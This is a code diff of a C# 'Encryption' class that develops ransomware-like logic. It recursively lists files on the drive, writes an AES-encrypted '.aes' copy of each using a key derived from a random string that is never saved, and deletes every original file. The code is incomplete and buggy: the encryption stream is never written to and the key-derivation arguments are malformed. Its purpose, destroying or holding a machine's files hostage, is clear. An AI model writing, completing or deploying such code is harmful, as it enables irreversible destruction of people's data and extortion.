@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Windows;
@@ -9,55 +10,115 @@ using System.Text;
 
 namespace EncryptionLogic
 {
-    public class Encryption
-    {
-	    private static Random random = new Random();
-		private static byte[] passwordBytes = new byte[];
-	    public string generate256BitKey()
-	    {
-		    const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()";
+	public class Encryption
+	{
+		private static Random random = new Random();
+		//private static byte[] passwordBytes = new byte[];
+
+		public string generate256BitKey()
+		{
+			const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()";
 
 			try
-		    {
-			    return new string(Enumerable.Repeat(chars, 256)
-				    .Select(s => s[random.Next(s.Length)]).ToArray());
-			  
-		    }
-		    catch (Exception e)
-		    {
-			    MessageBox.Show(e.Message);
-				
-		    }
-		    return null;
-	    }
-	    public int encryptDesktop()
-	    {
-			
-		    string filepath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-			DirectoryInfo d = new DirectoryInfo(filepath);
-		    foreach (var file in d.GetFiles())
-		    {
-				FileStream fsCrypt = new FileStream(file.Name, FileMode.Create);
-			    RijndaelManaged AES = new RijndaelManaged();
-			    AES.KeySize = 256;
-			    AES.BlockSize = 128;
+			{
+				return new string(Enumerable.Repeat(chars, 256)
+					.Select(s => s[random.Next(s.Length)]).ToArray());
 
-				var key = new Rfc2898DeriveBytes(password);
-		    } 
+			}
+			catch (Exception e)
+			{
+				MessageBox.Show(e.Message);
 
-		    byte[] encryptedBytes = null;
+			}
+			return null;
+		}
 
-		    byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
+		public static byte[] GenerateRandomSalt()
+		{
+			byte[] data = new byte[32];
 
-			
-		    
+			using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
+			{
+				for (int i = 0; i < 10; i++)
+				{
+					// Fille the buffer with the generated data
+					rng.GetBytes(data);
+				}
+			}
 
-			return 1;
-	    }
+			return data;
+		}
 
-	    private void encryptFile()
-	    {
-		    
-	    }
-    }
+		private void encryptFile(string file, Rfc2898DeriveBytes key)
+		{
+			FileStream fsCrypt = new FileStream(file + ".aes", FileMode.Create);
+			RijndaelManaged AES = new RijndaelManaged();
+			AES.KeySize = 256;
+			AES.BlockSize = 128;
+			AES.Padding = PaddingMode.PKCS7;
+			AES.Key = key.GetBytes(AES.KeySize / 8);
+			AES.IV = key.GetBytes(AES.BlockSize / 8);
+
+			CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);
+			File.Delete(file);
+		}
+
+		public int encryptDesktop()
+		{
+			try
+			{
+				//string filepath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+				List<string> filesList = getCDriveFiles().ToList();
+				//DirectoryInfo d = new DirectoryInfo(filepath);
+
+				string passwordBytes = generate256BitKey();
+				var key = new Rfc2898DeriveBytes(passwordBytes, 0, 50000);
+
+				foreach (var file in filesList)
+				{
+					encryptFile(file, key);
+				}
+
+				byte[] encryptedBytes = null;
+				return 1;
+			}
+			catch (Exception e)
+			{
+				MessageBox.Show(e.InnerException.ToString());
+				return 0;
+			}
+		}
+
+		public static IEnumerable<string> getCDriveFiles()
+		{
+			string currDirectory = Environment.GetFolderPath(Environment.SpecialFolder.System);
+			Queue<string> pending = new Queue<string>();
+			pending.Enqueue(currDirectory);
+			string[] tmp;
+			while (pending.Count > 0)
+			{
+				currDirectory = pending.Dequeue();
+				if (!currDirectory.Contains("Windows"))
+				{
+					try
+					{
+						tmp = Directory.GetFiles(currDirectory);
+					}
+					catch (Exception e)
+					{
+						continue;
+					}
+					for (int i = 0; i < tmp.Length; i++)
+					{
+						yield return tmp[i];
+					}
+					tmp = Directory.GetDirectories(currDirectory);
+					for (int i = 0; i < tmp.Length; i++)
+					{
+						pending.Enqueue(tmp[i]);
+					}
+				}
+			}
+		}
+	}
 }
